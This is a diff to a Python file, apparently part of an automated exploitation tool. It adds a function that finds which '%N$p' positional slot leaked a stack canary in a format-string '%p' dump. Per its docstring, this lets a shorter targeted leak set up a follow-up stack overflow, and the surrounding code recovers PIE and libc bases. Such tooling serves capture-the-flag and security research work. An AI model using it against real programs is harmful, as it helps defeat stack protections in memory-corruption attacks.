@@ -1764,6 +1764,33 @@ def _le_canary_words(data: bytes, cap: int = 64) -> list:
     return out
 
 
+_SEQ_DUMP_RE = re.compile(rb"0x[0-9a-fA-F]+|\(nil\)")
+
+
+def canary_slot_in_dump(dump: bytes, canary: int, trigger: bytes = b"") -> Optional[int]:
+    """The 1-based positional `%N$` slot the stack canary printed at, from a SEQUENTIAL `%p` dump.
+
+    A sequential `%p.%p.%p...` sink prints vararg 1, 2, 3, ... in order, so the canary's index among
+    the printed words is its slot. Recovering it lets the caller swap the long sequential trigger for
+    a SHORT targeted `%N$p` -- which fits a small bounded read() with no bytes left in the pipe to
+    shift the follow-up overflow (the edge where a sequential trigger longer than the leak read
+    broke discover_canary_offset and the skew sweep). Only valid for a sequential dump; None
+    otherwise (a positional dump or an over-read has no 1:1 index->slot mapping)."""
+    t = (trigger or b"").lstrip()
+    if not (t.startswith(b"%p") and b"$" not in t[:8]):     # not a plain sequential dump
+        return None
+    words = _SEQ_DUMP_RE.findall(dump or b"")
+    for i, w in enumerate(words):
+        if w == b"(nil)":
+            continue
+        try:
+            if int(w, 16) == (canary & 0xFFFFFFFFFFFFFFFF):
+                return i + 1                                 # value[i] printed by %<i+1>$
+        except ValueError:
+            continue
+    return None
+
+
 def classify_leak(vals, target_bytes: bytes, libc_data: bytes = b"") -> dict:
     """Auto-classify a leaked-pointer burst: recover the PIE base (from the binary's own symbols),
     the libc base (from libc's symbols, when a libc is given) and the stack canary, using ONLY the
